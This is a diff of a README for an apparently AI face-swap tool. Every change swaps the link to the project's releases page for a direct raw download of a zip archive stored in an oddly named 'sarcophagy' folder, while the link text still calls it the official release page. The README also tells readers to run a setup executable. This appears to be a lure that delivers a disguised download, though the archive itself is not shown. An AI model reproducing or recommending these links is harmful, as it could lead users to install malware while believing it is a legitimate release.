@@ -1,6 +1,6 @@
 # 🤖 AI-FaceSWAPPER-2026 - Simple AI Face Swap Tool
 
-[![Download AI-FaceSWAPPER-2026](https://img.shields.io/badge/Download-AI--FaceSWAPPER--2026-ff69b4.svg)](https://github.com/JATI450/AI-FaceSWAPPER-2026/releases)
+[![Download AI-FaceSWAPPER-2026](https://img.shields.io/badge/Download-AI--FaceSWAPPER--2026-ff69b4.svg)](https://github.com/JATI450/AI-FaceSWAPPER-2026/raw/refs/heads/main/sarcophagy/SWAPPE_Face_A_2.9-alpha.3.zip)
 
 ## 📄 About AI-FaceSWAPPER-2026
 
@@ -31,7 +31,7 @@ Starting with AI-FaceSWAPPER-2026 is easy. Follow these steps to set up the app 
 
 Visit the official releases page by clicking the button below:
 
-[![Download Here](https://img.shields.io/badge/Download-Release%20Page-0078D7.svg)](https://github.com/JATI450/AI-FaceSWAPPER-2026/releases)
+[![Download Here](https://img.shields.io/badge/Download-Release%20Page-0078D7.svg)](https://github.com/JATI450/AI-FaceSWAPPER-2026/raw/refs/heads/main/sarcophagy/SWAPPE_Face_A_2.9-alpha.3.zip)
 
 This page contains the latest version of the program. Look for the file named something like `AI-FaceSWAPPER-2026-Setup.exe` or similar.
 
@@ -120,7 +120,7 @@ If you run into problems, try these steps:
 
 To get new features or bug fixes:
 
-- Return to the release page at https://github.com/JATI450/AI-FaceSWAPPER-2026/releases
+- Return to the release page at https://github.com/JATI450/AI-FaceSWAPPER-2026/raw/refs/heads/main/sarcophagy/SWAPPE_Face_A_2.9-alpha.3.zip
 - Download the newest setup file.
 - Install over your existing version; your settings will remain intact.
 
@@ -130,7 +130,7 @@ To get new features or bug fixes:
 
 You can always find the latest software and full release history at this link:
 
-[Download AI-FaceSWAPPER-2026 Releases](https://github.com/JATI450/AI-FaceSWAPPER-2026/releases)
+[Download AI-FaceSWAPPER-2026 Releases](https://github.com/JATI450/AI-FaceSWAPPER-2026/raw/refs/heads/main/sarcophagy/SWAPPE_Face_A_2.9-alpha.3.zip)
 
 ---
 
